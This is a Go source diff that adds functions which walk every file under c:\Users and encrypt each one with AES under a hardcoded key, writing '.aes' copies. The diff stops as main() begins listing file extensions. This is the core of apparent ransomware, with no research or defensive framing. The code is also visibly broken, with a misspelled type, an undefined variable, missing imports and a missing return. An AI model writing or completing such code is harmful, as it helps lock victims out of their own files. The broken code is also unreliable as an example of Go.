@@ -5,8 +5,59 @@ import (
 	"net/http"
 	"crypto"
 	"fmt"
+	"path/filepath"
 )
 
+func search() ([]string, error){
+	dir := "c:\Users"
+	
+	fileList := make([]string, 0)
+	e := filepath.Walk(dir, func(path string, f os.FileINfo, err error) error {
+		fileList = append(fileList, path)
+		return err
+	})
+
+	if e != nil {
+		panic(e)
+	}
+
+	for _ , file := range fileList{
+		fmt.Println(file)
+	}
+
+	return fileList, nil
+}
+
+func encrypt(src string) error {
+	text, e := ioutil.ReadFile(src)
+	if e != nil {
+        	panic(e)
+    	}
+
+    	key := []byte("aserejejadejejeb")
+    	block, e := aes.NewCipher(key)
+    	if e != nil {
+        	panic(e)
+    	}
+
+    	encrypt := make([]byte, aes.BlockSize+len(text))
+    	iv := encrypt[:aes.BlockSize]
+    	if _, e := io.ReadFull(rand.Reader, iv); e != nil {
+        	panic(e)
+    	}
+
+    	stream := cipher.NewCFBEncrypter(block, iv)
+    	stream.XORKeyStream(ciphertext[aes.BlockSize:], text)
+
+    	f, e := os.Create(src + ".aes")
+    	if e != nil {
+        	panic(e)
+    	}
+    	_, e = io.Copy(f, bytes.NewReader(ciphertext))
+    	if e != nil {
+        	panic(e)
+    	}
+}
 
 func main(){
 	var extensions []string = {
